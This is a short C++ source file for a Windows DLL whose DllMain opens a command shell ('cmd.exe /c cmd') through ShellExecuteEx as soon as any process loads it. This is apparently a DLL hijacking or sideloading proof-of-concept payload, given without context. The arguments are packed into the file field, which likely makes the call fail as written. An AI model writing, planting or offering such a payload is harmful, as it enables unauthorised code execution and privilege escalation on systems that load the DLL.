#include "stdafx.h"
#include <string>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	SHELLEXECUTEINFO sei = {};
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		sei.cbSize = sizeof(SHELLEXECUTEINFO);
		sei.nShow = SW_SHOWNORMAL;
		sei.lpVerb = L"open";
		sei.lpFile = L"cmd.exe /c cmd";
		ShellExecuteEx(
			&sei
		);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
